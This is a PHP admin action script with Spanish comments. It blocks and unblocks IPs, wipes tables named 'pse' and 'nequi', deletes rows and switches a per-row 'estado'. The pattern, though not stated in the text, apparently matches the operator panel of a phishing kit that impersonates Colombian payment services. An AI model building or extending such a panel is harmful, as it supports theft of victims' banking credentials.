<?php
// god/actions.php
header('Content-Type: application/json');
require_once __DIR__ . '/auth.php';

// Cargar DB de forma segura
$conn = require __DIR__ . '/../config/db.php';

// Log sin filesystem
error_log('[actions] Request: ' . http_build_query($_GET));

// Detectar driver para queries compatibles
$driver = $conn->getAttribute(PDO::ATTR_DRIVER_NAME);

if (isset($_GET['action']) || isset($_GET['id'], $_GET['table'], $_GET['estado'])) {

    // ── Bloquear IP ──────────────────────────────────────────
    if (isset($_GET['action']) && $_GET['action'] === 'block_ip' && isset($_GET['ip'])) {
        try {
            if ($driver === 'pgsql') {
                $stmt = $conn->prepare("INSERT INTO blocked_ips (ip) VALUES (:ip) ON CONFLICT (ip) DO NOTHING");
            }
            else {
                $stmt = $conn->prepare("INSERT IGNORE INTO blocked_ips (ip) VALUES (:ip)");
            }
            $stmt->execute(['ip' => $_GET['ip']]);
            echo json_encode(['status' => 'success']);
        }
        catch (PDOException $e) {
            echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
        }
        exit;
    }

    // ── Desbloquear IP ───────────────────────────────────────
    if (isset($_GET['action']) && $_GET['action'] === 'unblock_ip' && isset($_GET['ip'])) {
        try {
            $stmt = $conn->prepare("DELETE FROM blocked_ips WHERE ip = :ip");
            $stmt->execute(['ip' => $_GET['ip']]);
            echo json_encode(['status' => 'success']);
        }
        catch (PDOException $e) {
            echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
        }
        exit;
    }

    // ── Limpiar todo ─────────────────────────────────────────
    if (isset($_GET['action']) && $_GET['action'] === 'delete_all') {
        try {
            foreach (['pse', 'nequi'] as $t) {
                if ($driver === 'pgsql') {
                    $conn->exec("TRUNCATE TABLE $t RESTART IDENTITY CASCADE");
                }
                else {
                    $conn->exec("TRUNCATE TABLE $t");
                }
            }
            echo json_encode(['status' => 'success', 'message' => 'Panel limpiado correctamente']);
        }
        catch (PDOException $e) {
            echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
        }
        exit;
    }

    // ── Acciones por item (requieren id + table) ─────────────
    if (!isset($_GET['id']) || !isset($_GET['table'])) {
        echo json_encode(['status' => 'error', 'message' => 'Faltan parámetros']);
        exit;
    }

    $id = intval($_GET['id']);
    $table = $_GET['table'];
    $estado = isset($_GET['estado']) ? intval($_GET['estado']) : 0;

    $allowed_tables = ['nequi', 'pse'];
    if (!in_array($table, $allowed_tables)) {
        echo json_encode(['status' => 'error', 'message' => 'Tabla no permitida']);
        exit;
    }

    // Eliminar item
    if (isset($_GET['action']) && $_GET['action'] === 'delete') {
        try {
            $stmt = $conn->prepare("DELETE FROM $table WHERE id = :id");
            $stmt->execute(['id' => $id]);
            echo json_encode(['status' => 'success', 'message' => 'Eliminado correctamente']);
        }
        catch (PDOException $e) {
            echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
        }
        exit;
    }

    // Actualizar estado
    try {
        $stmt = $conn->prepare("UPDATE $table SET estado = :estado WHERE id = :id");
        $stmt->execute(['estado' => $estado, 'id' => $id]);
        echo json_encode(['status' => 'success', 'message' => 'Estado actualizado']);
    }
    catch (PDOException $e) {
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
    }
    exit;

}
else {
    echo json_encode(['status' => 'error', 'message' => 'Faltan parámetros']);
}
?>